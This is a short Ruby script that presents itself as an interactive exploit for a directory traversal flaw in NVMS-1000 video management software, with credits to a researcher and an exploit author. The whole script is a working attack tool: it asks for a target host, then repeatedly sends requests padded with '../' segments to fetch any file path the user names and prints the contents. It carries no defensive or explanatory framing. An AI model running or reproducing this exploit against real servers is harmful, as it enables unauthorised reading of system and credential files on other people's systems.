######################################################################
#NVMS-1000 - Directory Traversal                                     #
#I don't find this vulnerability, I only write interactive exploit ;)#
#Reasercher who find vulnerability: Numan Türle                      #
#Exploit Author: J4c3kRz3znik                                        #
######################################################################
require 'net/http'

class String
  def red
    "\e[31m#{self}\e[0m"
  end
end

def sploit
  puts "[*] ".red + "Put here path for file what you wanna get example Users/asdf/Desktop/asdf.txt"
  path = gets.chomp
  exit if path == "exit"
  request = "/../../../../../../../../../../../../#{path}"

  response = Net::HTTP.get_response(@host, request)
   if response.code == '200'
      puts "[*] ".red + "There is your File output:"
      puts response.body
   else
      puts "[*] ".red + "There is your response Code ;) You know what's mean"
      puts response.body
   end
end
puts "[*] ".red + "If you wanna exit simply write exit"

puts "[*] ".red + "Put here hostname or ip address"  
@host = gets.chomp
exit if @host == "exit"

loop do
 sploit
end
